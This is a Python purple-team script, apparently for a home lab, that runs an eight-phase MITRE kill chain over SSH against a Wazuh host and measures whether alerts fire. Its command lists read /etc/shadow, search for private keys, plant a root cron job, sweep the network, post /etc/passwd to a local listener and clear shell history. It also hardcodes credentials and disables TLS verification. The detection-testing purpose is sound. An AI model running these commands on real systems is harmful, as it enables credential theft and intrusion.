import requests
import urllib3
import os
import time
import paramiko
from datetime import datetime, timezone, timedelta
from dotenv import load_dotenv

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
load_dotenv()

# ============ إعدادات الاتصال ============
WAZUH_API_URL = os.getenv("WAZUH_API_URL", "https://192.168.1.15:55000")
WAZUH_USER = os.getenv("WAZUH_USER", "api-user")
WAZUH_PASS = os.getenv("WAZUH_PASS", "PurpleOps2026!")

OPENSEARCH_URL = "https://192.168.1.15:9200"
OPENSEARCH_USER = "admin"
OPENSEARCH_PASS = "admin"

SSH_HOST = "192.168.1.15"
SSH_USER = "wazuh-user"
SSH_PASS = "wazuh"

# ============ سيناريو الهجوم الحقيقي (APT Kill Chain) ============
KILL_CHAIN = [
    {
        "phase": 1,
        "name": "🔍 Reconnaissance",
        "mitre": "T1082 - System Information Discovery",
        "tactic": "Discovery",
        "description": "جمع معلومات عن النظام المستهدف",
        "commands": [
            "whoami",
            "hostname",
            "uname -a",
            "cat /etc/os-release",
            "ifconfig",
            "ip addr show",
            "ps aux | head -20",
            "netstat -tuln"
        ],
        "expected_rules": [530, 550, 571],
        "risk_level": "LOW"
    },
    {
        "phase": 2,
        "name": "🚪 Initial Access",
        "mitre": "T1078 - Valid Accounts",
        "tactic": "Initial Access",
        "description": "محاولة الدخول عبر SSH بمستخدمين افتراضيين",
        "commands": [
            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 admin@127.0.0.1",
            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@127.0.0.1",
            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 test@127.0.0.1"
        ],
        "expected_rules": [5710, 5712],
        "risk_level": "MEDIUM"
    },
    {
        "phase": 3,
        "name": "⚡ Execution",
        "mitre": "T1059 - Command and Scripting Interpreter",
        "tactic": "Execution",
        "description": "تنفيذ أوامر مشبوهة عبر Bash",
        "commands": [
            "bash -c 'echo PurpleOps Execution Test'",
            "sh -c 'cat /etc/passwd | grep -E \"root|admin\"'",
            "python3 -c 'import os; print(os.getenv(\"USER\"))'",
            "curl -s http://127.0.0.1:55000 > /dev/null"
        ],
        "expected_rules": [550, 571, 1002],
        "risk_level": "MEDIUM"
    },
    {
        "phase": 4,
        "name": "🔓 Persistence",
        "mitre": "T1053.003 - Cron",
        "tactic": "Persistence",
        "description": "إنشاء Cron Job للبقاء في النظام",
        "commands": [
            "echo '* * * * * /bin/echo purpleops_persist' | sudo tee /tmp/purpleops_cron",
            "sudo crontab -u root /tmp/purpleops_cron",
            "sudo crontab -l",
            "sudo rm /tmp/purpleops_cron"
        ],
        "expected_rules": [554, 550, 571],
        "risk_level": "HIGH"
    },
    {
        "phase": 5,
        "name": "👑 Privilege Escalation",
        "mitre": "T1548.003 - Sudo and Sudo Caching",
        "tactic": "Privilege Escalation",
        "description": "رفع الصلاحيات عبر sudo",
        "commands": [
            "sudo -l",
            "sudo whoami",
            "sudo cat /etc/shadow",
            "sudo ls -la /root/"
        ],
        "expected_rules": [5402, 5403],
        "risk_level": "CRITICAL"
    },
    {
        "phase": 6,
        "name": "🔑 Credential Access",
        "mitre": "T1003 - OS Credential Dumping",
        "tactic": "Credential Access",
        "description": "محاولة الوصول لملفات كلمات المرور",
        "commands": [
            "sudo cat /etc/shadow",
            "sudo cat /etc/passwd",
            "find / -name '*.pem' 2>/dev/null | head -5",
            "sudo find / -name 'id_rsa' 2>/dev/null | head -5"
        ],
        "expected_rules": [550, 5402, 1002],
        "risk_level": "CRITICAL"
    },
    {
        "phase": 7,
        "name": "🔄 Lateral Movement",
        "mitre": "T1021.004 - Remote Services: SSH",
        "tactic": "Lateral Movement",
        "description": "محاكاة الحركة الجانبية عبر SSH",
        "commands": [
            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 wazuh-user@192.168.1.26 'echo lateral_test'",
            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 wazuh-user@192.168.1.24 'echo lateral_test'",
            "arp -a",
            "nmap -sn 192.168.1.0/24 2>/dev/null | head -10 || echo 'nmap not available'"
        ],
        "expected_rules": [5710, 5712, 1002],
        "risk_level": "HIGH"
    },
    {
        "phase": 8,
        "name": "📤 Exfiltration",
        "mitre": "T1048 - Exfiltration Over Alternative Protocol",
        "tactic": "Exfiltration",
        "description": "محاولة تسريب بيانات عبر HTTP",
        "commands": [
            "sudo cat /etc/passwd > /tmp/purpleops_data.txt",
            "curl -X POST -d @/tmp/purpleops_data.txt http://127.0.0.1:9999 2>/dev/null || echo 'exfil simulated'",
            "sudo rm -f /tmp/purpleops_data.txt",
            "history -c"
        ],
        "expected_rules": [550, 554, 1002],
        "risk_level": "CRITICAL"
    }
]

# ============ دوال الاتصال ============
def get_wazuh_token():
    url = f"{WAZUH_API_URL}/security/user/authenticate"
    response = requests.get(url, auth=(WAZUH_USER, WAZUH_PASS), verify=False)
    response.raise_for_status()
    return response.json()['data']['token']

def execute_ssh_command(command, timeout=10):
    """تنفيذ أمر حقيقي عبر SSH"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(SSH_HOST, username=SSH_USER, password=SSH_PASS, timeout=timeout)
        
        stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        
        client.close()
        return output.strip(), error.strip()
    except Exception as e:
        return None, str(e)

def search_alerts_in_window(rule_ids, minutes=5):
    """البحث عن alerts لـ rules معينة في إطار زمني"""
    url = f"{OPENSEARCH_URL}/wazuh-alerts-*/_search"
    now = datetime.now(timezone.utc)
    past = now - timedelta(minutes=minutes)
    
    query = {
        "query": {
            "bool": {
                "must": [
                    {"terms": {"rule.id": rule_ids}},
                    {"range": {
                        "timestamp": {
                            "gte": past.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
                            "lte": now.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
                        }
                    }}
                ]
            }
        },
        "sort": [{"timestamp": {"order": "desc"}}],
        "size": 20
    }
    
    try:
        response = requests.post(
            url, json=query,
            auth=(OPENSEARCH_USER, OPENSEARCH_PASS),
            verify=False, timeout=10
        )
        if response.status_code == 200:
            return response.json()['hits']['hits']
    except:
        pass
    return []

def search_recent_alerts(minutes=2):
    """البحث عن آخر alerts في إطار زمني"""
    url = f"{OPENSEARCH_URL}/wazuh-alerts-*/_search"
    now = datetime.now(timezone.utc)
    past = now - timedelta(minutes=minutes)
    
    query = {
        "query": {
            "range": {
                "timestamp": {
                    "gte": past.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
                    "lte": now.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
                }
            }
        },
        "sort": [{"timestamp": {"order": "desc"}}],
        "size": 30
    }
    
    try:
        response = requests.post(
            url, json=query,
            auth=(OPENSEARCH_USER, OPENSEARCH_PASS),
            verify=False, timeout=10
        )
        if response.status_code == 200:
            return response.json()['hits']['hits']
    except:
        pass
    return []

# ============ محرك محاكاة Kill Chain ============
def execute_phase(phase):
    """تنفيذ مرحلة واحدة من Kill Chain"""
    print(f"\n{'='*70}")
    print(f"🎯 المرحلة {phase['phase']}: {phase['name']}")
    print(f"   MITRE: {phase['mitre']}")
    print(f"   Tactic: {phase['tactic']}")
    print(f"   Risk Level: {phase['risk_level']}")
    print(f"   Description: {phase['description']}")
    print(f"{'='*70}")
    
    # تسجيل الوقت قبل الهجوم
    start_time = datetime.now(timezone.utc)
    
    # تنفيذ كل أمر
    command_results = []
    for i, cmd in enumerate(phase['commands'], 1):
        print(f"\n   [{i}/{len(phase['commands'])}] تنفيذ: {cmd}")
        
        output, error = execute_ssh_command(cmd)
        
        if output:
            # عرض جزء من الناتج
            preview = output[:100].replace('\n', ' ')
            print(f"      ✅ Output: {preview}...")
        elif error:
            print(f"      ⚠️  Error: {error[:80]}")
        else:
            print(f"      ⚙️  Executed (no output)")
        
        command_results.append({
            'command': cmd,
            'output': output,
            'error': error
        })
        
        # انتظار قصير بين الأوامر لمحاكاة سلوك حقيقي
        time.sleep(1.5)
    
    # انتظار ظهور الـ alerts
    print(f"\n   ⏳ انتظار 8 ثوانٍ لرصد الـ Alerts في Wazuh...")
    time.sleep(8)
    
    # التحقق من الاكتشاف
    print(f"\n🔵 [BLUE TEAM] التحقق من الاكتشاف...")
    hits = search_alerts_in_window(phase['expected_rules'], minutes=3)
    
    # أيضاً البحث عن أي alerts جديدة
    recent_alerts = search_recent_alerts(minutes=2)
    
    # تصفية alerts التي حدثت بعد بدء الهجوم
    relevant_alerts = []
    for hit in recent_alerts:
        alert_time = hit['_source'].get('timestamp', '')
        if alert_time >= start_time.strftime("%Y-%m-%dT%H:%M:%S"):
            relevant_alerts.append(hit)
    
    detected = len(hits) > 0 or len(relevant_alerts) > 0
    
    # عرض النتائج
    if detected:
        print(f"\n   ✅✅✅ تم اكتشاف المرحلة! ✅✅✅")
        print(f"   📊 عدد الـ Alerts: {len(hits) + len(relevant_alerts)}")
        
        # عرض أهم 3 alerts
        all_alerts = hits + relevant_alerts
        for alert in all_alerts[:3]:
            source = alert['_source']
            rule = source.get('rule', {})
            print(f"\n      🚨 Rule {rule.get('id')}: {rule.get('description')}")
            print(f"         Level: {rule.get('level')} | Time: {source.get('timestamp')}")
    else:
        print(f"\n   ❌ لم يتم اكتشاف المرحلة!")
        print(f"   💡 الـ SOC فشل في رصد هذه الأنشطة المشبوهة")
    
    return {
        'phase': phase['phase'],
        'name': phase['name'],
        'mitre': phase['mitre'],
        'tactic': phase['tactic'],
        'risk_level': phase['risk_level'],
        'detected': detected,
        'alerts_count': len(hits) + len(relevant_alerts),
        'commands_executed': len(phase['commands'])
    }

def run_full_killchain():
    """تنفيذ سيناريو Kill Chain كامل"""
    print("\n" + "="*70)
    print("🚀 بدء سيناريو APT Kill Chain الكامل")
    print("="*70)
    print(f"📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🎯 عدد المراحل: {len(KILL_CHAIN)}")
    print(f"🖥️  الهدف: {SSH_HOST}")
    print("="*70)
    
    # اختبار الاتصال أولاً
    print("\n🔄 اختبار الاتصال...")
    output, error = execute_ssh_command("echo 'Connection Test'")
    if output:
        print("✅ SSH Connection: OK")
    else:
        print(f"❌ SSH Connection Failed: {error}")
        return
    
    try:
        token = get_wazuh_token()
        print("✅ Wazuh API: Connected")
    except Exception as e:
        print(f"❌ Wazuh API Failed: {e}")
        return
    
    print("\n⚠️  تحذير: هذا سيناريو حقيقي سيُنفذ على النظام الفعلي!")
    print("⚠️  تأكد أنك في بيئة اختبار معزولة!")
    confirm = input("\nهل تريد المتابعة؟ (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("❌ تم الإلغاء")
        return
    
    # تنفيذ جميع المراحل
    results = []
    for phase in KILL_CHAIN:
        result = execute_phase(phase)
        results.append(result)
        
        # انتظار بين المراحل
        print(f"\n   ⏸️  انتظار 5 ثوانٍ قبل المرحلة التالية...")
        time.sleep(5)
    
    # التقرير النهائي
    print_final_report(results)

def print_final_report(results):
    """عرض التقرير النهائي"""
    print("\n" + "="*70)
    print("📊 APT Kill Chain - التقرير النهائي")
    print("="*70)
    
    detected_count = sum(1 for r in results if r['detected'])
    total_count = len(results)
    coverage = (detected_count / total_count * 100) if total_count > 0 else 0
    
    print(f"\n📈 Overall Detection Rate: {coverage:.1f}% ({detected_count}/{total_count})")
    
    # تحليل حسب مستوى الخطورة
    risk_analysis = {}
    for r in results:
        risk = r['risk_level']
        if risk not in risk_analysis:
            risk_analysis[risk] = {'total': 0, 'detected': 0}
        risk_analysis[risk]['total'] += 1
        if r['detected']:
            risk_analysis[risk]['detected'] += 1
    
    print("\n📊 Detection by Risk Level:")
    for risk in ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']:
        if risk in risk_analysis:
            data = risk_analysis[risk]
            rate = (data['detected'] / data['total'] * 100) if data['total'] > 0 else 0
            print(f"   {risk:10s}: {rate:5.1f}% ({data['detected']}/{data['total']})")
    
    print("\n📋 Detailed Results:")
    print(f"{'Phase':<6} {'Name':<35} {'Risk':<10} {'Status':<15} {'Alerts'}")
    print("-"*75)
    for r in results:
        status = "✅ DETECTED" if r['detected'] else "❌ MISSED"
        print(f"{r['phase']:<6} {r['name']:<35} {r['risk_level']:<10} {status:<15} {r['alerts_count']}")
    
    # تحليل الثغرات
    missed = [r for r in results if not r['detected']]
    if missed:
        print("\n⚠️  ثغرات في الـ SOC:")
        for r in missed:
            print(f"   - {r['mitre']} ({r['tactic']})")
    
    print("\n💡 التوصيات:")
    if coverage < 80:
        print("   1. تحسين قواعد الاكتشاف في Wazuh")
        print("   2. تفعيل Sysmon على الأنظمة Windows")
        print("   3. إضافة Rules للـ MITRE Techniques المفقودة")
    else:
        print("   ✅ أداء SOC ممتاز! استمر في التحسين المستمر")
    
    print("\n" + "="*70)

# ============ الوضع التفاعلي ============
def interactive_mode():
    """الوضع التفاعلي - تنفيذ مرحلة واحدة"""
    print("\n" + "="*70)
    print("🎯 APT Kill Chain - Interactive Mode")
    print("="*70)
    print("\n📋 المراحل المتاحة:")
    for phase in KILL_CHAIN:
        print(f"   {phase['phase']}. {phase['name']} ({phase['risk_level']})")
        print(f"      {phase['mitre']}")
    print(f"   {len(KILL_CHAIN) + 1}. تشغيل Kill Chain كامل")
    print(f"   {len(KILL_CHAIN) + 2}. الخروج")
    print("="*70)
    
    choice = input("\nاختر رقم المرحلة: ").strip()
    
    if choice.isdigit():
        choice = int(choice)
        if 1 <= choice <= len(KILL_CHAIN):
            phase = KILL_CHAIN[choice - 1]
            execute_phase(phase)
        elif choice == len(KILL_CHAIN) + 1:
            run_full_killchain()
        elif choice == len(KILL_CHAIN) + 2:
            print("👋 الخروج")
        else:
            print("❌ اختيار غير صالح")

def main():
    print("\n" + "="*70)
    print("🛡️ R&M PurpleOps - APT Kill Chain Simulator")
    print("="*70)
    print("\nهذا simulator ينفذ هجمات حقيقية على النظام!")
    print("تأكد من أنك في بيئة اختبار معزولة.\n")
    
    print("اختر الوضع:")
    print("   1. 🎯 Interactive Mode (مرحلة واحدة)")
    print("   2. 🚀 Full Kill Chain (كل المراحل)")
    print("   3. ❌ الخروج")
    
    choice = input("\nاختر: ").strip()
    
    if choice == '1':
        interactive_mode()
    elif choice == '2':
        run_full_killchain()
    elif choice == '3':
        print("👋 الخروج")
    else:
        print("❌ اختيار غير صالح")

if __name__ == "__main__":
    main()